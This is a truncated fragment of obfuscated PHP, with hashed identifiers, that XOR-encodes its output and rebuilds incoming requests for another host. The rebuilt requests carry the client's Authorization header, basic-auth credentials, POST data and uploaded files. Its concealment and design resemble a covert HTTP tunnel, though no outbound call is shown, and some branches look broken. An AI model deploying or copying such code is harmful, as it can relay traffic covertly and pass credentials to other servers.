<?php
 error_reporting (E_ALL); function Fa7198e9d($V13b5bfe9, $V0800fc57) { $V7385af06 = 0; $V8ce4b16b = strlen($V13b5bfe9);
for($V865c0c0b = 0; $V865c0c0b < $V8ce4b16b; $V865c0c0b++) { echo chr(ord($V13b5bfe9[$V865c0c0b]) ^ ord($V0800fc57[$V7385af06++]));
if($V7385af06 == 256) { $V7385af06 = 0; } } } function Fde49e74b($V4ccdcbc7, $Vd5d3db17, $V1cb251ec, $Vcaf9b6b9, $V627fcdb6, $Vab6c0400, $V0800fc57)
{ $Vb45cffe0 = "<!-- ".htmlspecialchars($Vcaf9b6b9)." --><html><head><title>".htmlspecialchars($Vd5d3db17)."</title></head><body><p><strong>".htmlspecialchars($V1cb251ec)."</strong></p></body></html>";
if($V627fcdb6) { if(!headers_sent()) { header($V4ccdcbc7); header("Content-Type: text/html"); header("Content-Length: ".strlen($Vb45cffe0));
} } else { $Vc68271a6 = $V4ccdcbc7."\r\n"; $Vc68271a6 .= "Content-Type: text/html\r\n"; $Vc68271a6 .= "Content-Length: ".strlen($Vb45cffe0)."\r\n\r\n";
} if($Vab6c0400) { Fa7198e9d($Vc68271a6.$Vb45cffe0, $V0800fc57); } else { echo $Vc68271a6.$Vb45cffe0;
} } function F672708e1($Vea9f6aca, $V67b3dba8, $V9305b73d, $V81788ba0, $V131d5a3d, $V6e4e41b1) { if(empty($Vea9f6aca))
 { if(!empty($_SERVER["REQUEST_METHOD"])) { $Vea9f6aca = $_SERVER["REQUEST_METHOD"]; } else { $Vea9f6aca = "GET";
} } if(empty($V81788ba0)) { if(!empty($_SERVER["SERVER_PROTOCOL"])) { $V81788ba0 = $_SERVER["SERVER_PROTOCOL"];
} else { $V81788ba0 = "HTTP/1.0"; } } $Vcbb5a449 = parse_url($V9305b73d); $V9305b73d = $Vcbb5a449["path"].(isset($Vcbb5a449["query"])?("?".$Vcbb5a449["query"]):"");
$Vb25ffa68 = $Vea9f6aca." ".$V9305b73d." ".$V81788ba0."\r\n"; if(!empty($_SERVER["HTTP_CACHE_CONTROL"]))
 { $Vb25ffa68 .= "Cache-Control: ".$_SERVER["HTTP_CACHE_CONTROL"]."\r\n"; } $Vb25ffa68 .= "Connection: close\r\n";
 if(!empty($_SERVER["HTTP_PRAGMA"])) { $Vb25ffa68 .= "Pragma: ".$_SERVER["HTTP_PRAGMA"]."\r\n"; }
 if(!empty($_SERVER["HTTP_VIA"])) { $Vb25ffa68 .= "Via: ".$_SERVER["HTTP_VIA"]."\r\n"; } if(!empty($_SERVER["HTTP_ACCEPT"]))
 { $Vb25ffa68 .= "Accept: ".$_SERVER["HTTP_ACCEPT"]."\r\n"; } if(!empty($_SERVER["HTTP_ACCEPT_CHARSET"]))
 { $Vb25ffa68 .= "Accept-Charset: ".$_SERVER["HTTP_ACCEPT_CHARSET"]."\r\n"; } if(!empty($_SERVER["HTTP_ACCEPT_ENCODING"]))
 { $Vb25ffa68 .= "Accept-Encoding: ".$_SERVER["HTTP_ACCEPT_ENCODING"]."\r\n"; } if(!empty($_SERVER["HTTP_ACCEPT_LANGUAGE"]))
 { $Vb25ffa68 .= "Accept-Language: ".$_SERVER["HTTP_ACCEPT_LANGUAGE"]."\r\n"; } if($V6e4e41b1) { if(!empty($V131d5a3d))
 { $Vb25ffa68 .= "Authorization: ".$V131d5a3d."\r\n"; } else if(!empty($_SERVER["HTTP_AUTHORIZATION"]))
 { $Vb25ffa68 .= "Authorization: ".$_SERVER["HTTP_AUTHORIZATION"]."\r\n"; } else if(!empty($_SERVER["PHP_AUTH_USER"]))
 { $Vb25ffa68 .= "Authorization: Basic ".base64_encode($_SERVER["PHP_AUTH_USER"].":".(empty($_SERVER["PHP_AUTH_PW"])?"":$_SERVER["PHP_AUTH_PW"]))."\r\n";
} } $Vb25ffa68 .= "Host: ".$V67b3dba8."\r\n"; if(!empty($_SERVER["HTTP_IF_MODIFIED_SINCE"]))
 { $Vb25ffa68 .= "If-Modified-Since: ".$_SERVER["HTTP_IF_MODIFIED_SINCE"]."\r\n"; } if(!empty($_SERVER["HTTP_IF_NONE_MATCH"]))
 { $Vb25ffa68 .= "If-None-Match: ".$_SERVER["HTTP_IF_NONE_MATCH"]."\r\n"; } if(!empty($_SERVER["HTTP_IF_RANGE"]))
 { $Vb25ffa68 .= "If-Range: ".$_SERVER["HTTP_IF_RANGE"]."\r\n"; } if(!empty($_SERVER["HTTP_IF_UNMODIFIED_SINCE"]))
 { $Vb25ffa68 .= "If-Unmodified-Since: ".$_SERVER["HTTP_IF_UNMODIFIED_SINCE"]."\r\n"; } if(!empty($_SERVER["HTTP_RANGE"]))
 { $Vb25ffa68 .= "Range: ".$_SERVER["HTTP_RANGE"]."\r\n"; } if(!empty($_SERVER["HTTP_REFERER"])) {
 $Vb25ffa68 .= "Referer: ".$_SERVER["HTTP_REFERER"]."\r\n"; } if(!empty($_SERVER["HTTP_USER_AGENT"]))
 { $Vb25ffa68 .= "User-Agent: ".$_SERVER["HTTP_USER_AGENT"]."\r\n"; } $V42b90196 = ""; if((!empty($_SERVER["CONTENT_TYPE"]) && (strncmp($_SERVER["CONTENT_TYPE"], "multipart/form-data", 19) == 0)) || !empty($_FILES))
 { if((strlen($_SERVER["CONTENT_TYPE"]) > 19) && (strncmp(substr($_SERVER["CONTENT_TYPE"], 19), "; boundary=", 11) == 0))
 { $V9da49716 = substr($_SERVER["CONTENT_TYPE"], 30); $Vb25ffa68 .= "Content-Type: ".$_SERVER["CONTENT_TYPE"]."\r\n";
} else { $V9da49716 = md5(uniqid(rand(), true)); $Vb25ffa68 .= "Content-Type: multipart/form-data; boundary=".$V9da49716."\r\n";
} $Vf7bd60b7 = count($_POST); if($Vf7bd60b7) { foreach($_POST as $Vb2145aac => $V2063c160) { if(is_array($V2063c160))
 { foreach($V2063c160 as $V3a6d0284) { if(get_magic_quotes_gpc()) { $V3a6d0284 = stripslashes($V3a6d0284);
} $V42b90196 .= "--".$V9da49716."\r\nContent-Disposition: form-data; name=\"".$Vb2145aac."[]\"\r\n\r\n".$V3a6d0284."\r\n";
} } else { if(get_magic_quotes_gpc()) { $V2063c160 = stripslashes($V2063c160); } $V42b90196 .= "--".$V9da49716."\r\nContent-Disposition: form-data; name=\"".$Vb2145aac."\"\r\n\r\n".$V2063c160."\r\n";
} } } $Vf7bd60b7 = count($_FILES); if($Vf7bd60b7) { foreach($_FILES as $Vb068931c => $Vb2145aac)
 { if(is_array($Vb2145aac['name'])) { foreach($Vb2145aac['name'] as $V3c6e0b8a => $V2063c160) {
 if(!is_array($Vb2145aac['name'][$V3c6e0b8a])) { $V42b90196 .= "--".$V9da49716."\r\nContent-Disposition: form-data; name=\"".$Vb068931c."[]\"; filename=\"".$Vb2145aac['name'][$V3c6e0b8a]."\"\r\n";
$V42b90196 .= "Content-Type: ".(empty($Vb2145aac['type'][$V3c6e0b8a])?"application/octet-stream":$Vb2145aac['type'][$V3c6e0b8a])."\r\n\r\n";
 if($Vb2145aac['error'][$V3c6e0b8a] == 0) { $V0666f0ac = @fopen($Vb2145aac['tmp_name'][$V3c6e0b8a], "r");
if($V0666f0ac) { while(!feof($V0666f0ac)) { $V42b90196 .= fread($V0666f0ac, 2048); } fclose($V0666f0ac);
unlink($Vb2145aac['tmp_name'][$V3c6e0b8a]); } } $V42b90196 .= "\r\n"; } } } else { $V42b90196 .= "--".$V9da49716."\r\nContent-Disposition: form-data; name=\"".$Vb068931c."\"; filename=\"".$Vb2145aac['name']."\"\r\n";
$V42b90196 .= "Content-Type: ".(empty($Vb2145aac['type'])?"application/octet-stream":$Vb2145aac['type'])."\r\n\r\n";
 if($Vb2145aac['error'] == 0) { $V0666f0ac = @fopen($Vb2145aac['tmp_name'], "r"); if($V0666f0ac) {
 while(!feof($V0666f0ac)) { $V42b90196 .= fread($V0666f0ac, 2048); } fclose($V0666f0ac); unlink($Vb2145aac['tmp_name']);
} } $V42b90196 .= "\r\n"; } } } $V42b90196 .= "--".$V9da49716."--\r\n"; $Vb25ffa68 .= "Content-Length: ".strlen($V42b90196)."\r\n";
} else if(!empty($_POST)) { $V0666f0ac = @fopen("php://input", "r"); if($V0666f0ac) { while(!feof($V0666f0ac))
 { $V42b90196 .= fread($V0666f0ac, 2048); } fclose($V0666f0ac); } else if(isset($HTTP_RAW_POST_DATA)) { $V42b90196 = $HTTP_RAW_POST_DATA;
} else { $Vf7bd60b7 = count($_POST); if($Vf7bd60b7) { $V865c0c0b = 0; foreach($_POST as $Vb2145aac => $V2063c160)
 { if(is_array($V2063c160)) { $V3a9c78f0 = count($V2063c160); $V363b122c = 0; foreach($V2063c160 as $V3a6d0284)
 { if(get_magic_quotes_gpc()) { $V3a6d0284 = stripslashes($V3a6d0284); } $V42b90196 .= "--".$V9da49716."\r\nContent-Disposition: form-data; name=\"".$Vb2145aac."[]\"\r\n\r\n".$V3a6d0284."\r\n";
if($V363b122c++ < ($V3a9c78f0-1)) { $V42b90196 .= "&"; } } } else { if(get_magic_quotes_gpc()) {
 $V2063c160 = stripslashes($V2063c160); } } $V42b90196 .= $Vb2145aac."=".urlencode($V2063c160); if($V865c0c0b++ < ($Vf7bd60b7-1))
 { $V42b90196 .= "&"; } } } } $Vb25ffa68 .= "Content-Type: application/x-www-form-urlencoded\r\n";
$Vb25ffa68 .= "Content-Length: ".strlen($V42b90196)."\r\n"; ?>
